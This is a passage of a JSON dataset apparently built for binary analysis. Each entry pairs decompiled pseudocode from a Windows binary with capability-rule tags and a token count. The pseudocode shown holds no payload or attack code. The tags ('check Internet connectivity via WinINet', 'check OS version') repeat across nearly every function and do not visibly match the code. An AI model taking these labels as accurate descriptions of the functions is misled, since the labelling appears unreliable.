-0x3fffff66;\n                        fcn.00030d24(*arg2);\n                        *arg2 = 0;\n                        *arg3 = 0;\ncode_r0x0003b862:\n                        fcn.0001abd4(uStack688, uStack680);\n                        uVar6 = uStackX32;\n                    }\n                }\n            }\n        }\n        if (aiStackX8[0] != 0) {\n            (**0x11060)();\n        }\n        if (iStack696 != 0) {\n            (**0x11068)(iStack696, 0);\n        }\n        *(iStack360 + 0x28) = uVar6;\n        fcn.0006670a(arg1, auStack408, 0x150);\n    }\n    return iVar2;\n}\n",
        "token_count": 1969
    },
    "0003ba44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003ba44(ulong arg1)\n\n{\n    ulong uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t arg1_00;\n    int64_t iVar4;\n    char32_t cVar5;\n    uint64_t uVar6;\n    uchar auStack648 [16];\n    uchar uStack632;\n    uchar uStack631;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    ulong uStack600;\n    ulong uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ulong uStack568;\n    ulong uStack552;\n    ulong uStack536;\n    ulong uStack520;\n    ulong uStack512;\n    ulong uStack504;\n    ulong uStack448;\n    ulong uStack440;\n    ulong uStack432;\n    uchar auStack392 [48];\n    int64_t iStack344;\n    \n    fcn.00066704(auStack648, 0x1203c);\n    fcn.0006670a(auStack392, arg1, 0x150);\n    uVar1 = *(iStack344 + 0x28);\n    (**0x11070)(0x801a8, arg1, auStack648, 0);\n    if (*0x801a8 == 0) {\n        iVar3 = -0x3fffffff;\n    }\n    else {\n        fcn.0006685a(&uStack632, 0xf0);\n        uStack624 = 0x3b8dc;\n        uStack600 = 0x3b8f0;\n        uStack584 = 0x3b900;\n        uStack632 = 5;\n        uStack568 = 0x3b924;\n        uStack631 = 1;\n        uStack552 = 0x3b944;\n        uStack616 = 0;\n        uStack520 = 0x3b95c;\n        uStack608 = 0;\n        uStack512 = 0x3b974;\n        uStack536 = 0x3b990;\n        uStack504 = 0x3b9b0;\n        uStack592 = 0x3b9d0;\n        uStack576 = 0x3b9e0;\n        uStack448 = 0x3b9fc;\n        uStack440 = 0x3ba14;\n        uStack432 = 0x3ba34;\n        iVar3 = (**0x11000)(*0x801a8, &uStack632, 0xf0);\n        if (iVar3 == 0) {\n            arg1_00 = (*_fcn.000114a8)(arg1);\n            if (arg1_00 == 0) {\n                iVar3 = -0x3fffffff;\n            }\n            else {\n                uVar6 = 0;\n                do {\n                    cVar5 = uVar6;\n                    iVar4 = uVar6 + arg1_00;\n                    cVar2 = (**0x114b0)(iVar4);\n                    if ((cVar2 == '\\0') || (cVar2 = (**0x114b0)(iVar4 + 0xf0),  cVar2 == '\\0')) break;\n                    iVar3 = fcn.0006674c(iVar4, &uStack632, 0xf0, 1, 1);\n                    if (iVar3 == 0) goto code_r0x0003bc3f;\n                    uVar6 = cVar5 + L'\\x01';\n                } while (cVar5 + L'\\x01' < 0xc0);\n                cVar5 = L'\\xffffffff';\ncode_r0x0003bc3f:\n                if (cVar5 != L'\\xffffffff') {\n                    str.ppqx[2] = cVar5 + L'\\x01';\n                    str.ppqx[1] = cVar5;\n                }\n                str.ppqx[0] = cVar5;\n                str.ppqx[3] = fcn.0003d23c(arg1_00, 0x200, 0x3b8dc);\n                if (((((str.ppqx[3] == L'\\xffffffff') ||\n                      (*0x8e3f8 = fcn.0003d23c(arg1_00, 0x200, 0x3b8f0),  *0x8e3f8 == -1)) ||\n                     (*0x8e400 = fcn.0003d23c(arg1_00, 0x200, 0x3b900),  *0x8e400 == -1)) ||\n                    (((*0x8e408 = fcn.0003d23c(arg1_00, 0x200, 0x3b924),  *0x8e408 == -1 ||\n                      (*0x8e410 = fcn.0003d23c(arg1_00, 0x200, 0x3b944),  *0x8e410 == -1)) ||\n                     ((*0x8e420 = fcn.0003d23c(arg1_00, 0x200, 0x3b95c),  *0x8e420 == -1 ||\n                      ((*0x8e424 = fcn.0003d23c(arg1_00, 0x200, 0x3b974),  *0x8e424 == -1 ||\n                       (*0x8e418 = fcn.0003d23c(arg1_00, 0x200, 0x3b990),  *0x8e418 == -1)))))))) ||\n                   ((*0x8e428 = fcn.0003d23c(arg1_00, 0x200, 0x3b9b0),  *0x8e428 == -1 ||\n                    ((((*0x8e3fc = fcn.0003d23c(arg1_00, 0x200, 0x3b9d0),  *0x8e3fc == -1 ||\n                       (*0x8e404 = fcn.0003d23c(arg1_00, 0x200, 0x3b9e0),  *0x8e404 == -1)) ||\n                      (*0x8e444 = fcn.0003d23c(arg1_00, 0x200, 0x3b9fc),  *0x8e444 == -1)) ||\n                     (*0x8e448 = fcn.0003d23c(arg1_00, 0x200, 0x3ba14),  *0x8e448 == -1)))))) {\n                    iVar3 = 0x21590005;\n                }\n                else {\n                    *0x8e44c = fcn.0003d23c(arg1_00, 0x200, 0x3ba34);\n                    iVar3 = 0;\n                    if (*0x8e44c == -1) {\n                        iVar3 = 0x21590005;\n                    }\n                }\n            }\n        }\n        if (*0x801a8 != 0) {\n            (**0x11068)(*0x801a8, 0);\n        }\n    }\n    *(iStack344 + 0x28) = uVar1;\n    fcn.0006670a(arg1, auStack392, 0x150);\n    return iVar3;\n}\n",
        "token_count": 1639
    },
    "0003d284": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003d284(int64_t arg1, uint *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    \n    uVar2 = *0x8e4e8;\n    if ((*(*0x8e4e4 + arg1) == '\\x06') &&\n       ((((cVar1 = *(uVar2 + arg1),  cVar1 == '\\0' || (cVar1 == '\\x01')) || (cVar1 == '\\x02')) || (cVar1 == '\\x14')))) {\n        if ((*(*0x8e4ec + arg1) & 1) != 0) {\n            return 0x21590001;\n        }\n        *arg2 = 6;\n        cVar1 = *(uVar2 + arg1);\n    }\n    else {\n        uVar2 = *0x8e3e8;\n        if ((*(*0x8e3e4 + arg1) != '\\x05') ||\n           (((cVar1 = *(uVar2 + arg1),  cVar1 != '\\0' && (cVar1 != '\\x01')) && (cVar1 != '\\x02')))) {\n            if (*(*0x8e3e4 + arg1) != '\\x04') {\n                return 0x21590001;\n            }\n            if (*(uVar2 + arg1) == '\\0') {\n                *arg2 = 4;\n                *arg3 = 0;\n                return 0;\n            }\n            return 0x21590001;\n        }\n        *arg2 = 5;\n        cVar1 = *(uVar2 + arg1);\n    }\n    *arg3 = cVar1;\n    return 0;\n}\n",
        "token_count": 390
    },
    "0003d4c4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003d4c4(ulong arg1, ulong noname_1, ulong arg3, uchar *arg4)\n\n{\n    int16_t iVar1;\n    ulong in_stack_00000028;\n    uchar auStack56 [24];\n    \n    iVar1 = (**0x11058)();\n    fcn.00066704(auStack56, 0x1203c);\n    fcn.0006685a(arg4, 0x98);\n    *arg4 = 0x8a;\n    if (iVar1 == 0) {\n        arg4[1] = 1;\n        *(arg4 + 2) = 0x88;\n    }\n    else {\n        arg4[1] = 2;\n        *(arg4 + 2) = 0x98;\n        *(arg4 + 0x88) = 0x3d494;\n        *(arg4 + 0x90) = 0x3d4ac;\n    }\n    *(arg4 + 0x10) = 0x3d340;\n    *(arg4 + 0x18) = 0x3d358;\n    *(arg4 + 0x20) = 0x3d32c;\n    arg4[4] = 6;\n    *(arg4 + 0x28) = 0x3d378;\n    arg4[5] = iVar1;\n    *(arg4 + 0x30) = 0x3d388;\n    arg4[6] = 6;\n    *(arg4 + 0x38) = 0x3d47c;\n    arg4[7] = 0;\n    *(arg4 + 0x40) = 0x3d3a0;\n    *(arg4 + 0x48) = 0x3d3b8;\n    *(arg4 + 0x50) = 0x3d3d8;\n    *(arg4 + 0x58) = 0x3d3f4;\n    *(arg4 + 0x70) = 0x3d40c;\n    *(arg4 + 0x78) = 0x3d424;\n    *(arg4 + 0x60) = 0x3d438;\n    *(arg4 + 0x68) = 0x3d44c;\n    *(arg4 + 0x80) = 0x3d464;\n    (**0x8e6b0)(arg1, auStack56, arg3, arg4, in_stack_00000028);\n    return;\n}\n",
        "token_count": 571
    },
    "0003d61c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0003d61c(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    char32_t cVar7;\n    int32_t aiStackX8 [2];\n    uint32_t auStackX16 [2];\n    int64_t iStackX24;\n    ulong uStackX32;\n    uint uVar9;\n    int64_t *piVar8;\n    ulong uStack584;\n    ulong uStack576;\n    uchar auStack568 [160];\n    uchar auStack408 [48];\n    int64_t iStack360;\n    \n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        return 0x21590065;\n    }\n    fcn.0006670a(auStack408, arg1, 0x150);\n    uStackX32 = *(iStack360 + 0x28);\n    piVar8 = &iStackX24;\n    uVar3 = fcn.0003d4c4(arg1, 0, &uStackX32, auStack568);\n    iVar4 = iStackX24;\n    uVar5 = uVar3 & 0xffffffff;\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar3 = 0;\n    do {\n        uVar9 = piVar8 >> 0x20;\n        cVar7 = uVar3;\n        iVar6 = uVar3 + iVar4;\n        cVar1 = (**0x114b0)(iVar6);\n        if ((cVar1 == '\\0') || (cVar1 = (**0x114b0)(iVar6 + 0x98),  cVar1 == '\\0')) break;\n        piVar8 = CONCAT44(uVar9, 1);\n        iVar2 = fcn.0006674c(iVar6, auStack568, 0x98, 1, piVar8);\n        if (iVar2 == 0) goto code_r0x0003d706;\n        uVar3 = cVar7 + L'\\x01';\n    } while (cVar7 + L'\\x01' < 0x200);\n    cVar7 = L'\\xffffffff';\ncode_r0x0003d706:\n    if (cVar7 != L'\\xffffffff') {\n        str.ptux[1] = cVar7 + L'\\x04';\n        str.ptux[2] = cVar7 + L'\\x05';\n        str.ptux[3] = cVar7 + L'\\b';\n    }\n    str.ptux[0] = cVar7;\n    str.ptux[4] = fcn.0003d23c(iStackX24, 0x200, 0x3d340);\n    if ((((((((str.ptux[4] != L'\\xffffffff') && (*0x8e4f4 = fcn.0003d23c(iStackX24, 0x200, 0x3d358),  *0x8e4f4 != -1))\n            && (*0x8e4f8 = fcn.0003d23c(iStackX24, 0x200, 0x3d32c),  *0x8e4f8 != -1)) &&\n           ((*0x8e4fc = fcn.0003d23c(iStackX24, 0x200, 0x3d378),  *0x8e4fc != -1 &&\n            (*0x8e500 = fcn.0003d23c(iStackX24, 0x200, 0x3d388),  *0x8e500 != -1)))) &&\n          ((*0x8e504 = fcn.0003d23c(iStackX24, 0x200, 0x3d47c),  *0x8e504 != -1 &&\n           ((*0x8e508 = fcn.0003d23c(iStackX24, 0x200, 0x3d3a0),  *0x8e508 != -1 &&\n            (*0x8e50c = fcn.0003d23c(iStackX24, 0x200, 0x3d3b8),  *0x8e50c != -1)))))) &&\n         (*0x8e510 = fcn.0003d23c(iStackX24, 0x200, 0x3d3d8),  *0x8e510 != -1)) &&\n        (((*0x8e514 = fcn.0003d23c(iStackX24, 0x200, 0x3d3f4),  *0x8e514 != -1 &&\n          (*0x8e518 = fcn.0003d23c(iStackX24, 0x200, 0x3d40c),  *0x8e518 != -1)) &&\n         (*0x8e51c = fcn.0003d23c(iStackX24, 0x200, 0x3d424),  *0x8e51c != -1)))) &&\n       (((*0x8e520 = fcn.0003d23c(iStackX24, 0x200, 0x3d438),  *0x8e520 != -1 &&\n         (*0x8e524 = fcn.0003d23c(iStackX24, 0x200, 0x3d44c),  *0x8e524 != -1)) &&\n        (*0x8e528 = fcn.0003d23c(iStackX24, 0x200, 0x3d464),  *0x8e528 != -1)))) {\n        uStackX32 = *(iStack360 + 0x28);\n        iVar4 = iStackX24;\n        *0x8e52c = fcn.0003d23c(iStackX24, 0x200, &uStackX32);\n        if (*0x8e52c != -1) {\n            fcn.0001aac0(CONCAT71(iVar4 >> 8, 2), &uStack584, &uStack576);\n            iVar4 = iStackX24;\n            do {\n                iVar2 = fcn.0003d284(iVar4, aiStackX8, auStackX16);\n                if (((iVar2 == 0) && (aiStackX8[0] == 6)) && (iVar4 != iStackX24)) {\n                    fcn.0003956c(iVar4, auStackX16[0]);\n                }\n                iVar4 = *(iVar4 + 8);\n            } while (iVar4 != 0);\n            fcn.0001abd4(uStack584, uStack576);\n            goto code_r0x0003da03;\n        }\n    }\n    uVar5 = 0x21590005;\ncode_r0x0003da03:\n    (**0x8e6e0)(iStackX24);\n    *(iStack360 + 0x28) = uStackX32;\n    fcn.0006670a(arg1, auStack408, 0x150);\n    return uVar5;\n}\n",
        "token_count": 1635
    },
    "0003da90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003da90(ulong arg1, uint *arg2)\n\n{\n    uint64_t *puVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    ulong *arg1_00;\n    ulong *puVar4;\n    uint32_t uVar5;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong uVar14;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [2];\n    int64_t *piStackX32;\n    int64_t iStack184;\n    int64_t iStack176;\n    int64_t iStack168;\n    int64_t iStack160;\n    uchar auStack152 [8];\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack96;\n    ulong *puVar6;\n    \n    *0x80290 = *0x150c0;\n    *0x80298 = *0x150c8;\n    iStack168 = 0;\n    iStack176 = 0;\n    piStackX32 = NULL;\n    iStack184 = 0;\n    fcn.0006677c(*0x150c0, auStack152, 0, 0x48);\n    uStack144 = *arg2;\n    uStack140 = arg2[1];\n    uStack136 = arg2[2];\n    uStack132 = arg2[3];\n    uStack128 = 1;\n    uStack96 = 0xffffffff;\n    iVar3 = (**0x8e690)(arg1, auStack152);\n    arg1_00 = NULL;\n    if ((((iVar3 == 0) && (iVar3 = (**0x8e680)(arg1, iStack168, 0xffffffff, &piStackX32, auStackX16),  iVar3 == 0)) &&\n        (arg1_00 = NULL,  auStackX16[0] != 0)) && (arg1_00 = fcn.00030c98(0x10),  arg1_00 != NULL)) {\n        uVar12 = 1;\n        uVar11 = 1;\n        uVar14 = *(*piStackX32 + 0x50);\n        uVar2 = *(*piStackX32 + 0x58);\n        *arg1_00 = uVar14;\n        arg1_00[1] = uVar2;\n        if (1 < auStackX16[0]) {\n            iStack160 = 0x10;\n            iVar8 = 8;\n            uVar9 = auStackX16[0];\n            do {\n                puVar4 = NULL;\n                if (uVar11 != 0) {\n                    puVar6 = puVar4;\n                    do {\n                        puVar1 = *(piStackX32 + iVar8) + 0x50;\n                        bVar13 = arg1_00[puVar6 * 2] < *puVar1;\n                        if ((arg1_00[puVar6 * 2] != *puVar1) ||\n                           (puVar1 = *(piStackX32 + iVar8) + 0x58,  bVar13 = arg1_00[puVar6 * 2 + 1] < *puVar1, \n                           iVar3 = 0,  arg1_00[puVar6 * 2 + 1] != *puVar1)) {\n                            iVar3 = (1 - bVar13) - (bVar13 != 0);\n                        }\n                        if (iVar3 == 0) goto code_r0x0003dc77;\n                        uVar5 = puVar6 + 1;\n                        puVar6 = uVar5;\n                    } while (uVar5 < uVar11);\n                }\n                uVar11 = uVar11 + 1;\n                if (uVar11 == 0) {\n                    fcn.00030d24(arg1_00);\n                }\n                else {\n                    puVar4 = fcn.00030c98(uVar11 << 4);\n                    if (puVar4 == NULL) goto code_r0x0003dd89;\n                    fcn.0006670a(puVar4);\n                    fcn.00030d24(arg1_00);\n                }\n                uVar14 = *(*(piStackX32 + iVar8) + 0x50);\n                uVar2 = *(*(piStackX32 + iVar8) + 0x58);\n                *(iStack160 + puVar4) = uVar14;\n                (iStack160 + puVar4)[1] = uVar2;\n                iStack160 = iStack160 + 0x10;\n                arg1_00 = puVar4;\n                uVar9 = auStackX16[0];\ncode_r0x0003dc77:\n                uVar12 = uVar12 + 1;\n                iVar8 = iVar8 + 8;\n            } while (uVar12 < uVar9);\n            if (uVar11 != 1) {\n                iVar3 = (**0x8e698)(uVar14, arg1, 0, &iStack176);\n                if ((iVar3 == 0) &&\n                   (iVar3 = (**0x8e6a0)(arg1, iStack176, 0xffffffff, &iStack184, auStackX24),  iVar3 == 0)) {\n                    uVar10 = 0;\n                    uVar7 = 0;\n                    if (uVar11 != 0) {\n                        do {\n                            uVar12 = 0;\n                            if (auStackX24[0] == 0) break;\n                            iVar8 = 0;\n                            do {\n                                puVar1 = *(iStack184 + iVar8 * 8);\n                                bVar13 = arg1_00[uVar7 * 2] < *puVar1;\n                                if ((arg1_00[uVar7 * 2] == *puVar1) &&\n                                   (bVar13 = arg1_00[uVar7 * 2 + 1] < puVar1[1],  arg1_00[uVar7 * 2 + 1] == puVar1[1]))\n                                {\n                                    iVar3 = 0;\n                                }\n                                else {\n                                    iVar3 = (1 - bVar13) - (bVar13 != 0);\n                                }\n                                if (iVar3 == 0) break;\n                                uVar12 = uVar12 + 1;\n                                iVar8 = iVar8 + 1;\n                            } while (uVar12 < auStackX24[0]);\n                            if (auStackX24[0] <= uVar12) break;\n                            puVar4 = *(iStack184 + iVar8 * 8);\n                            if (uVar10 <= *(puVar4 + 8) && *(puVar4 + 8) != uVar10) {\n                                *0x80290 = *puVar4;\n                                *0x80298 = puVar4[1];\n                                uVar10 = *(*(iStack184 + iVar8 * 8) + 0x40);\n                            }\n                            uVar12 = uVar7 + 1;\n                            uVar7 = uVar12;\n                        } while (uVar12 < uVar11);\n                    }\n                }\n                goto code_r0x0003dd89;\n            }\n        }\n        *0x80290 = *(*piStackX32 + 0x50);\n        *0x80298 = *(*piStackX32 + 0x58);\n    }\ncode_r0x0003dd89:\n    if (piStackX32 != NULL) {\n        (**0x8e678)(&piStackX32);\n    }\n    if (iStack184 != 0) {\n        (**0x8e678)(&iStack184);\n    }\n    if (iStack168 != 0) {\n        (**0x8e688)(arg1);\n    }\n    if (iStack176 != 0) {\n        (**0x8e6a8)(arg1);\n    }\n    if (arg1_00 != NULL) {\n        fcn.00030d24(arg1_00);\n    }\n    return 0x80290;\n}\n",
        "token_count": 1831
    },
    "0003de04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003de04(ulong *arg1, ulong *arg2, ulong arg3, ulong arg4)\n\n{\n    bool bVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    ulong in_stack_00000038;\n    int32_t *in_stack_00000048;\n    int64_t *in_stack_00000050;\n    int64_t iStack440;\n    int64_t aiStack432 [2];\n    ulong uStack416;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    ulong uStack384;\n    ulong uStack344;\n    ulong uStack336;\n    uint uStack312;\n    uchar auStack308 [44];\n    uint uStack264;\n    uchar auStack260 [20];\n    ulong uStack240;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    ulong *puStack160;\n    uint uStack152;\n    uint *puStack144;\n    uint uStack136;\n    ulong uStack132;\n    ulong uStack124;\n    \n    uStack264 = 0;\n    fcn.0006677c(auStack260, 0, 0xc4);\n    iStack440 = 0;\n    aiStack432[0] = 0;\n    uStack312 = 0;\n    fcn.0006677c(auStack308, 0, 0x24);\n    piVar2 = in_stack_00000050;\n    bVar1 = false;\n    if (((*in_stack_00000050 != 0) && (iVar3 = (**0x7ffb8)(*0x802b0, *in_stack_00000050, &iStack440),  iVar3 == 0)) &&\n       (iStack440 != 0)) {\n        (**0x8e678)(&iStack440);\n        return 0;\n    }\n    *piVar2 = 0;\n    if (((*in_stack_00000048 == 0) ||\n        (((iVar3 = (**0x7ffd0)(*0x802b0, *in_stack_00000048, aiStack432),  iVar3 != 0 || (aiStack432[0] == 0)) &&\n         (*in_stack_00000048 = 0,  aiStack432[0] == 0)))) || ((**0x8e678)(aiStack432),  *in_stack_00000048 == 0)) {\n        fcn.0006677c(&uStack404, 0, 0x2c);\n        uStack408 = *arg2;\n        uStack404 = *(arg2 + 4);\n        uStack400 = *(arg2 + 1);\n        uStack396 = *(arg2 + 0xc);\n        uStack384 = arg4;\n        iVar3 = (**0x7ffc0)(arg3, &uStack408, in_stack_00000048);\n        if (iVar3 != 0) goto code_r0x0003e0af;\n        bVar1 = true;\n        uStack416 = 0;\n        fcn.0006677c(&uStack404, 0, 0x54);\n        uStack408 = *arg2;\n        uStack404 = *(arg2 + 4);\n        uStack400 = *(arg2 + 1);\n        uStack396 = *(arg2 + 0xc);\n        uStack344 = *arg1;\n        uStack336 = arg1[1];\n        uStack416 = 0x1203c;\n        uStack384 = 0x1203c;\n        iVar3 = (**0x7ffc8)(uStack344, in_stack_00000038, *0x802b0, &uStack408, 0, 0);\n        if (iVar3 == 0) goto code_r0x0003dfe3;\n    }\n    else {\ncode_r0x0003dfe3:\n        uStack200 = *arg1;\n        uStack196 = *(arg1 + 4);\n        uStack192 = *(arg1 + 1);\n        uStack188 = *(arg1 + 0xc);\n        uStack240 = 0x1203c;\n        puVar4 = fcn.0003da90(*0x802b0, arg1);\n        uStack184 = *puVar4;\n        uStack180 = puVar4[1];\n        uStack176 = puVar4[2];\n        uStack172 = puVar4[3];\n        puStack160 = &stack0x00000050;\n        in_stack_00000050 = 0xffffffffffffffff;\n        uStack168 = 4;\n        uStack132 = *arg2;\n        uStack124 = arg2[1];\n        puStack144 = &uStack312;\n        uStack136 = 0x4005;\n        uStack152 = 0;\n        iVar3 = (**0x7ffb0)(uStack132, *0x802b0, &uStack264, 0, piVar2);\n        if (iVar3 == 0) {\n            return 0;\n        }\n        if (!bVar1) goto code_r0x0003e0af;\n    }\n    (**0x7ffa0)(*in_stack_00000048);\ncode_r0x0003e0af:\n    *in_stack_00000048 = 0;\n    *piVar2 = 0;\n    return iVar3;\n}\n",
        "token_count": 1237
    },
    "0003faec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003faec(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    bool bVar4;\n    uchar auStackX24 [16];\n    \n    if ((*0x80378 != 0) || (*0x80370 != NULL)) {\n        fcn.00032650(0x80358, auStackX24, 1);\n        ppiVar1 = NULL;\n        ppiVar2 = *0x80370;\n        if (*0x80370 != NULL) {\n            do {\n                ppiVar3 = ppiVar2;\n                if (arg1 == ppiVar2) break;\n                ppiVar3 = *ppiVar2;\n                ppiVar1 = ppiVar2;\n                ppiVar2 = ppiVar3;\n            } while (ppiVar3 != NULL);\n            if ((ppiVar3 != NULL) && (((arg2 != 0 || (*(arg1 + 0x7f4) == 0)) || (*(arg1 + 0xfe) != 2)))) {\n                ppiVar2 = *arg1;\n                if (ppiVar1 != NULL) {\n                    *ppiVar1 = *arg1;\n                    ppiVar2 = *0x80370;\n                }\n                *0x80370 = ppiVar2;\n                fcn.00032684(0x80358, auStackX24, 1);\n                fcn.00032650(arg1 + 0x101, auStackX24, 1);\n                ppiVar1 = arg1[0x107];\n                while (ppiVar1 != NULL) {\n                    ppiVar2 = *ppiVar1;\n                    fcn.00030d24(ppiVar1[3]);\n                    fcn.00030d24(ppiVar1);\n                    ppiVar1 = ppiVar2;\n                }\n                fcn.00032684(arg1 + 0x101, auStackX24, 1);\n                fcn.000326c0(arg1 + 0x101);\n                bVar4 = *(arg1 + 0x7da) == 1;\n                ppiVar1 = arg1 + 0xeb;\n                if (bVar4) {\n                    ppiVar1 = arg1 + 0xda;\n                }\n                fcn.0004bd34(bVar4, 6, ppiVar1);\n                fcn.0003f47c(arg1 + 0xeb, *(arg1 + 0xfb), arg1 + 0xda);\n                fcn.00030d24(arg1);\n                return;\n            }\n        }\n        fcn.00032684(0x80358, auStackX24, 1);\n    }\n    return;\n}\n",
        "token_count": 616
    },
    "0003e70c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003e70c(ulong arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX16 [3];\n    \n    LOCK();\n    bVar2 = *0x80310 == 1;\n    *0x80310 = *0x80310 ^ bVar2 * (*0x80310 ^ 1);\n    if (bVar2) {\n        if ((arg1 != 0) && (arg1 != *0x80288)) {\n            iVar1 = fcn.00050ebc(arg1, 0x15768, auStackX16);\n            if (iVar1 != 0) {\n                return;\n            }\n            fcn.0004fa0c(arg1, auStackX16[0]);\n        }\n        *0x80310 = 0;\n        if (*0x80318 != 0) {\n            fcn.0002fcb8(0x80328);\n            iVar1 = fcn.00032794(0x80318);\n            if (iVar1 == 0) {\n                fcn.000667be(*0x80318, 0, 0);\n            }\n            *0x80318 = 0;\n            *0x80320 = 0;\n            fcn.0002fc94(0x80328);\n        }\n        if (*0x802b8 != 0) {\n            (**0x7ffa0)();\n        }\n        if (*0x802c8 != 0) {\n            (**0x7ffa0)();\n        }\n        if (*0x802d8 != 0) {\n            (**0x7ffa0)();\n        }\n        if (*0x802e8 != 0) {\n            (**0x7ffa0)();\n        }\n        if (*0x802b0 != 0) {\n            (**0x7ff78)();\n        }\n        *0x802b0 = 0;\n        fcn.0003f588();\n        if (*0x80308 != 0) {\n            (**0x7fee8)();\n            *0x80308 = 0;\n        }\n        if (*0x80300 != 0) {\n            (**0x7ff70)();\n            *0x80300 = 0;\n        }\n        if (*0x802f8 != 0) {\n            (**0x7fed8)();\n            *0x802f8 = 0;\n        }\n        fcn.0003f7cc();\n        (*_fcn.00011388)(*0x802a8);\n        *0x80288 = 0;\n    }\n    return;\n}\n",
        "token_count": 566
    },
    "0003f314": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003f314(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t *puVar3;\n    bool bVar4;\n    uint32_t *apuStackX8 [4];\n    uchar auStack280 [272];\n    \n    apuStackX8[0] = NULL;\n    LOCK();\n    bVar4 = *0x80310 == 1;\n    *0x80310 = *0x80310 ^ bVar4 * (*0x80310 ^ 1);\n    if (!bVar4) {\n        uVar2 = fcn.00030564(5, apuStackX8);\n        puVar3 = apuStackX8[0];\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        while( true ) {\n            do {\n                iVar1 = fcn.00031f44(puVar3[0x14], auStack280, 0x104);\n            } while (iVar1 == 0);\n            iVar1 = fcn.000667ee(auStack280, 0x11d68);\n            if (iVar1 == 0) {\n                fcn.0003f2d0(*(puVar3 + 0x14));\n            }\n            if (*puVar3 == 0) break;\n            puVar3 = puVar3 + *puVar3;\n        }\n        fcn.00030d24(apuStackX8[0]);\n    }\n    return 0;\n}\n",
        "token_count": 331
    },
    "0003f3b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
